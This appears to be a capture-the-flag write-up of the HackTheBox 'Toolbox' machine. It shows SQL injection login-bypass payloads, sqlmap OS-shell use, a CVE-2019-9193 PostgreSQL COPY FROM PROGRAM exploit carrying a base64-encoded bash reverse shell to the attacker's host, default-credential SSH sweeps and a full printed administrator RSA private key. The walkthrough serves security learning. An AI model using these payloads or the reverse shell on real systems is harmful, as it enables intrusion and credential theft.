---
layout: post
title: SQL Injection to System Domination - A Journey through HTB's Toolbox Machine
date: 13/04/2024
author: Nehal Zaman
tags: ["sql injection", "cve-2019-9193", "boot2docker"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/toolbox/banner.png)

# INTRODUCTION

Hey everyone! Welcome to this blog where we'll explore the [Toolbox](https://app.hackthebox.com/machines/Toolbox) machine on HackTheBox. 

Our journey begins with exploiting an `SQL injection` vulnerability in a web application. 

Next up, we'll leverage `CVE-2019-9193` in `PostgreSQL` to gain access as a low privileged user. 

Then, we'll move laterally to another box, where we'll uncover the administrator's `SSH` key for privilege escalation. 

Ready to dive in? Let's get started!

# SCANNING

Our scanning began with `Rustscan`, revealing a number of open ports on the machine: `21`, `22`, `135`, `139`, `443`, `445`, `49664`, `49665`, `49666`, `49667`, `49668`, and `49669`.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/toolbox]
└─$ rustscan -a 10.10.10.236 --ulimit 5000 | tee -a scan/rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.236:21
Open 10.10.10.236:22
Open 10.10.10.236:135
Open 10.10.10.236:139
Open 10.10.10.236:445
Open 10.10.10.236:443
Open 10.10.10.236:49664
Open 10.10.10.236:49667
Open 10.10.10.236:49665
Open 10.10.10.236:49666
Open 10.10.10.236:49669
Open 10.10.10.236:49668
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-10 11:37 EDT
Initiating Ping Scan at 11:37
Scanning 10.10.10.236 [2 ports]
Completed Ping Scan at 11:37, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:37
Completed Parallel DNS resolution of 1 host. at 11:37, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:37
Scanning 10.10.10.236 [12 ports]
Discovered open port 445/tcp on 10.10.10.236
Discovered open port 21/tcp on 10.10.10.236
Discovered open port 139/tcp on 10.10.10.236
Discovered open port 22/tcp on 10.10.10.236
Discovered open port 443/tcp on 10.10.10.236
Discovered open port 135/tcp on 10.10.10.236
Discovered open port 49669/tcp on 10.10.10.236
Discovered open port 49667/tcp on 10.10.10.236
Discovered open port 49664/tcp on 10.10.10.236
Discovered open port 49666/tcp on 10.10.10.236
Discovered open port 49665/tcp on 10.10.10.236
Discovered open port 49668/tcp on 10.10.10.236
Completed Connect Scan at 11:37, 0.95s elapsed (12 total ports)
Nmap scan report for 10.10.10.236
Host is up, received conn-refused (0.40s latency).
Scanned at 2024-04-10 11:37:54 EDT for 1s

PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack
22/tcp    open  ssh          syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
443/tcp   open  https        syn-ack
445/tcp   open  microsoft-ds syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
```

Moving on to `Nmap`, we further explored these ports to uncover the services and versions running behind them. 

Additionally, `Nmap` detected a domain name, `admin.megalogistic.com`, prompting us to add both `admin.megalogistic.com` and its parent domain `megalogistic.com` to our `/etc/hosts` file for future reference.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/toolbox]
└─$ nmap -sC -sV -p21,22,135,139,443,445,49664,49665,49666,49667,49668,49669 10.10.10.236 -oN scan/nmap.log
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-10 11:40 EDT
Nmap scan report for 10.10.10.236
Host is up (0.43s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.38 (Debian)
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
|_http-title: MegaLogistics
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-10T15:42:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.37 seconds
```

# ENUMERATING RPC

To explore `RPC`, we needed valid credentials, which were not available to us at that time.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/toolbox]
└─$ rpcclient -U="" 10.10.10.236
Password for [WORKGROUP\]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

# ENUMERATING SMB

Exploring `SMB` revealed that it didn't allow authentication with null credentials. We required valid credentials to gain access.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/toolbox]
└─$ smbclient -L \\\\10.10.10.236        
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

# ENUMERATING FTP

`FTP` allowed for anonymous login.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/toolbox]
└─$ ftp 10.10.10.236
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:kali): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Within the `FTP`, we discovered a single file named `docker-toolbox.exe`.

```
ftp> ls
229 Entering Extended Passive Mode (|||52086|)
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"
ftp> get docker-toolbox.exe
local: docker-toolbox.exe remote: docker-toolbox.exe
229 Entering Extended Passive Mode (|||55377|)
150 Opening data channel for file download from server of "/docker-toolbox.exe"
100% |***********************************************************************************************************************************************************************************************|   231 MiB  159.12 KiB/s    00:00 ETA
226 Successfully transferred "/docker-toolbox.exe"
242520560 bytes received in 24:48 (159.12 KiB/s)
ftp>
```

However, we were unable to write files to the `FTP` using anonymous access.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/toolbox]
└─$ echo Testing > test.txt
```

```
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||61389|)
550 Permission denied
ftp>
```

# ENUMERATING WEB - MAIN DOMAIN

The homepage of the main domain appeared to be static.

![Main Domain Homepage](/assets/images/writeups/toolbox/1.png)

We conducted directory fuzzing but didn't find anything noteworthy.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/toolbox]
└─$ dirsearch -u https://10.10.10.236 -w ~/Documents/SecLists/Discovery/Web-Content/big.txt -f -e php,html,txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, html, txt | HTTP method: GET | Threads: 25 | Wordlist size: 102246

Output File: /home/kali/Documents/ctf/htb/toolbox/reports/https_10.10.10.236/_24-04-10_12-57-36.txt

Target: https://10.10.10.236/

[12:57:36] Starting: 
[13:02:59] 200 -    3KB - /about.html                                       
[13:06:02] 200 -    2KB - /blog.html                                        
[13:08:24] 200 -    2KB - /contact.html                                     
[13:08:51] 301 -  312B  - /css  ->  https://10.10.10.236/css/               
[13:08:51] 403 -  278B  - /css/                                             
[13:12:01] 301 -  314B  - /fonts  ->  https://10.10.10.236/fonts/           
[13:12:01] 403 -  278B  - /fonts/
[13:14:15] 403 -  278B  - /icons/                                           
[13:14:26] 301 -  315B  - /images  ->  https://10.10.10.236/images/         
[13:14:26] 403 -  278B  - /images/                                          
[13:14:50] 200 -    3KB - /industries.html                                  
[13:15:44] 403 -  278B  - /js/                                              
[13:15:44] 301 -  311B  - /js  ->  https://10.10.10.236/js/                 
[13:25:06] 403 -  278B  - /server-status/                                   
[13:25:06] 403 -  278B  - /server-status                                    
[13:25:08] 200 -    2KB - /services.html                                    
                                                                              
Task Completed
```

# ENUMERATING WEB - SUBDOMAIN

Upon visiting the home page of the subdomain `admin.megalogistic.com`, we encountered a login page.

![Subdomain Login Page](/assets/images/writeups/toolbox/2.png)

# DISCOVERING SQL INJECTION TO RCE

Given the presence of a login page, we naturally sought out `SQL injection` vulnerabilities as the primary target.

We injected `'` into both the username and password parameters. The response's warning message confirmed the existence of a `SQL injection` vulnerability.

```
POST / HTTP/1.1
Host: admin.megalogistic.com
Cookie: PHPSESSID=6a1d9cd5507743ba05d54745db7325a6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: https://admin.megalogistic.com
Referer: https://admin.megalogistic.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

username=admin'&password=admin'
```

```
HTTP/1.1 200 OK
Date: Wed, 10 Apr 2024 17:34:37 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.3.14
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1355
Connection: close
Content-Type: text/html; charset=UTF-8

<br />
<b>Warning</b>:  pg_query(): Query failed: ERROR:  syntax error at or near &quot;admin&quot;
LINE 1: ...sers WHERE username = 'admin'' AND password = md5('admin'');
                                                              ^ in <b>/var/www/admin/index.php</b> on line <b>10</b><br />
<br />
<b>Warning</b>:  pg_num_rows() expects parameter 1 to be resource, bool given in <b>/var/www/admin/index.php</b> on line <b>11</b><br />
<html lang="en" >
<head>
.
.
.
SNIP
```

We also utilized SQL injection to bypass the authentication mechanism and gain access to the `admin` dashboard.

```
POST / HTTP/1.1
Host: admin.megalogistic.com
Cookie: PHPSESSID=daac641255d8d78188d0013f65dc9f2b
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://admin.megalogistic.com
Referer: https://admin.megalogistic.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

username=admin%27+or+1%3D1+--+-&password=password
```

```
HTTP/1.1 302 Found
Date: Sat, 13 Apr 2024 11:46:22 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.3.14
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: dashboard.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

Furthermore, we utilized `sqlmap` to achieve Remote Code Execution (`RCE`) using the `--os-shell` option. We successfully executed the `id` command to confirm the exploit.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/toolbox]
└─$ sqlmap -r login.txt --os-shell --force-ssl --level 3  
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.8.2#stable}                                                                                                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:23:15 /2024-04-10/

[15:23:15] [INFO] parsing HTTP request from 'login.txt'
[15:23:15] [INFO] resuming back-end DBMS 'postgresql' 
[15:23:15] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin%' AND 3415=(SELECT (CASE WHEN (3415=3415) THEN 3415 ELSE (SELECT 5860 UNION SELECT 8064) END))-- XnrJ&password=admin

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=admin%';SELECT PG_SLEEP(5)--&password=admin

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind (comment)
    Payload: username=admin%' AND 2662=(SELECT 2662 FROM PG_SLEEP(5))--&password=admin
---
[15:23:17] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[15:23:17] [INFO] fingerprinting the back-end DBMS operating system
[15:23:21] [INFO] the back-end DBMS operating system is Linux
[15:23:23] [INFO] testing if current user is DBA
[15:23:24] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:23:24] [INFO] retrieved: 1
[15:23:37] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[15:23:37] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] 

[15:23:43] [INFO] retrieved: uid=102(postgres) @id=104(postgrds) grotps=104(postgres),102(ssl-cert)
command standard output: 'uid=102(postgres) @id=104(postgrds) grotps=104(postgres),102(ssl-cert)'
os-shell> 
```

# MANUAL ANALYSIS - SHELL AS POSTGRES

As hackers, understanding how some automation tool managed to execute system commands is crucial for us. Let's dissect it manually.

From the `sqlmap` output, we identified `PostgreSQL` as the backend database. We further verified this manually by inducing the server to sleep for a few seconds using the SQL injection payload `admin||pg_sleep(10)--`.

Upon investigation, we stumbled upon an intriguing CVE (`CVE-2019-9193`). In PostgreSQL versions `9.3` through `11.2`, the `COPY TO/FROM PROGRAM` function enables superusers and users in the `pg_execute_server_program` group to execute arbitrary code within the context of the database's operating system user. This feature, enabled by default, can be exploited to run arbitrary operating system commands on Windows, Linux, and macOS.

To exploit this issue, we needed to stack SQL queries at the injection point. We verified the presence of a `stacked SQL injection` vulnerability. The following request made the server sleep for 10 seconds using stacked queries in SQL injection:

```
POST / HTTP/1.1
Host: admin.megalogistic.com
Cookie: PHPSESSID=e7c7df4d235f97353183e4f3c5d0233b
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Origin: https://admin.megalogistic.com
Referer: https://admin.megalogistic.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

username=enzy'+AND+password+%3d+md5('admin')%3b+SELECT+pg_sleep(10)%3b--&password=admin
```

Now, to exploit the issue, we crafted the following SQL query:

```sql
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM '<your-system-commands>';
DROP TABLE IF EXISTS cmd_exec;
```

This query would create a table `cmd_exec` with one text column `cmd_output`, copy the output of a system command into the created column, and finally delete the created table.

With this knowledge, we executed the exploit:

```
POST / HTTP/1.1
Host: admin.megalogistic.com
Cookie: PHPSESSID=e7c7df4d235f97353183e4f3c5d0233b
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 197
Origin: https://admin.megalogistic.com
Referer: https://admin.megalogistic.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

username=enzy'+AND+password+%3d+md5('admin')%3bCREATE+TABLE+cmd_exec(cmd_output+text)%3bCOPY+cmd_exec+FROM+PROGRAM+'echo+YmFzaCAtYyAiYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDMgMD4mMSIK+|+base64+-d+|+bash'%3bDROP+TABLE+IF+EXISTS+cmd_exec%3b--&password=admin
```

This allowed us to gain shell access:

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.17] from (UNKNOWN) [10.10.10.236] 49793
bash: cannot set terminal process group (392): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ 
```

# PRIVILEGE ESCALATION

Upon inspection, we discovered that we're operating within a Docker container, specifically a `boot2docker` instance.

```
postgres@bc56e3cc55e9:/$ uname -a
Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux
```

Researching further, we learned that `Boot2Docker` is a lightweight Linux distribution designed exclusively to run Docker containers. The default login credentials for the main `boot2docker` host are `docker:tcuser`.

To explore further, we attempted to SSH into the primary `boot2docker` container within the Docker network using the default credentials.

The IP address of the main `boot2docker` container was found to be `172.17.0.1`, and we successfully gained access.

```
postgres@bc56e3cc55e9:/$ for i in `seq 1 255`
> do
> ssh docker@172.17.0.$i
> done
docker@172.17.0.1's password: 
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$
```

Inside the container, we noticed that the `C` drive of the main host running `boot2docker` was mounted. Exploring further, we found the administrator's SSH key in a directory.

```
docker@box:/c/Users/Administrator/.ssh$ ls                                     
authorized_keys  id_rsa           id_rsa.pub       known_hosts
docker@box:/c/Users/Administrator/.ssh$ cat id_rsa                             
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
aJ1GunZCyic0iSwemcBJiNyfZChTipWmBMK88wIDAQABAoIBAH7PEuBOj+UHrM+G
Stxb24LYrUa9nBPnaDvJD4LBishLzelhGNspLFP2EjTJiXTu5b/1E82qK8IPhVlC
JApdhvDsktA9eWdp2NnFXHbiCg0IFWb/MFdJd/ccd/9Qqq4aos+pWH+BSFcOvUlD
vg+BmH7RK7V1NVFk2eyCuS4YajTW+VEwD3uBAl5ErXuKa2VP6HMKPDLPvOGgBf9c
l0l2v75cGjiK02xVu3aFyKf3d7t/GJBgu4zekPKVsiuSA+22ZVcTi653Tum1WUqG
MjuYDIaKmIt9QTn81H5jAQG6CMLlB1LZGoOJuuLhtZ4qW9fU36HpuAzUbG0E/Fq9
jLgX0aECgYEA4if4borc0Y6xFJxuPbwGZeovUExwYzlDvNDF4/Vbqnb/Zm7rTW/m
YPYgEx/p15rBh0pmxkUUybyVjkqHQFKRgu5FSb9IVGKtzNCtfyxDgsOm8DBUvFvo
qgieIC1S7sj78CYw1stPNWS9lclTbbMyqQVjLUvOAULm03ew3KtkURECgYEA17Nr
Ejcb6JWBnoGyL/yEG44h3fHAUOHpVjEeNkXiBIdQEKcroW9WZY9YlKVU/pIPhJ+S
7s++kIu014H+E2SV3qgHknqwNIzTWXbmqnclI/DSqWs19BJlD0/YUcFnpkFG08Xu
iWNSUKGb0R7zhUTZ136+Pn9TEGUXQMmBCEOJLcMCgYBj9bTJ71iwyzgb2xSi9sOB
MmRdQpv+T2ZQQ5rkKiOtEdHLTcV1Qbt7Ke59ZYKvSHi3urv4cLpCfLdB4FEtrhEg
5P39Ha3zlnYpbCbzafYhCydzTHl3k8wfs5VotX/NiUpKGCdIGS7Wc8OUPBtDBoyi
xn3SnIneZtqtp16l+p9pcQKBgAg1Xbe9vSQmvF4J1XwaAfUCfatyjb0GO9j52Yp7
MlS1yYg4tGJaWFFZ

GSfe+tMNP+XuJKtN4JSjnGgvHDoks8dbYZ5jaN03Frvq2HBY
RGOPwJSN7emx4YKpqTPDRmx/Q3C/sYos628CF2nn4aCKtDeNLTQ3qDORhUcD5BMq
bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
-----END RSA PRIVATE KEY-----
docker@box:/c/Users/Administrator/.ssh$ 
```

With this key, we gained shell access as the `administrator`.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/toolbox]
└─$ ssh -i id_rsa administrator@10.10.10.236
Microsoft Windows [Version 10.0.17763.1039]
(c) 2018 Microsoft Corporation. All rights reserved.

administrator@TOOLBOX C:\Users\Administrator>
```

# CONCLUSION

Our journey began with finding a `SQL injection` loophole in the web application.

By leveraging `CVE-2019-9193` in `PostgreSQL`, we elevated our privileges to gain shell access as `postgres` user.

Subsequently, we horizontally traversed to the `boot2docker` instance, where we discovered that the main host's `C` drive was mounted, containing the administrator's SSH key.

Utilizing this `SSH` key, we successfully obtained shell access as the `administrator`.

That wraps up our exploration of this box. 

Thanks for sticking around until the end. Catch you in the next adventure!